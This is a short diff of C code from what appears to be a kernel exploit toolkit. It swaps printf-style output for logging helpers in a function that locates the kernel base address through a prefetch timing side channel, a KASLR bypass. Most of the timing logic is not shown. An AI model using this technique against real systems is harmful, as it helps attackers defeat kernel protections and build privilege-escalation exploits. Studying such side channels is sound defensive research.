@@ -51,7 +51,7 @@ static u64 find_outlier_index(const u64 *times, u64 count) {
 }
 
 u64 prefetch_kbase() {
-    puts("[ ] finding kbase by prefetch side-channel attack");
+    log_info("finding kbase by prefetch side-channel attack");
     u64 num_trials = 10;
     const u64 num_vote = 10;
     const u64 start = 0xffffffff81000000;
@@ -91,12 +91,12 @@ u64 prefetch_kbase() {
                 }
             }
             if (count > num_vote / 2) {
-                printf("[+] found kbase by prefetch side-channel attack");
-                printf("[+] kbase = %#lx\n", addr);
+                log_success("found kbase by prefetch side-channel attack");
+                log_success("kbase = %#lx", addr);
                 return addr;
             }
         }
     }
-    puts("[-] unable to detect kbase by prefetch side-channel attack");
+    log_error("unable to detect kbase by prefetch side-channel attack");
     return 0;
 }
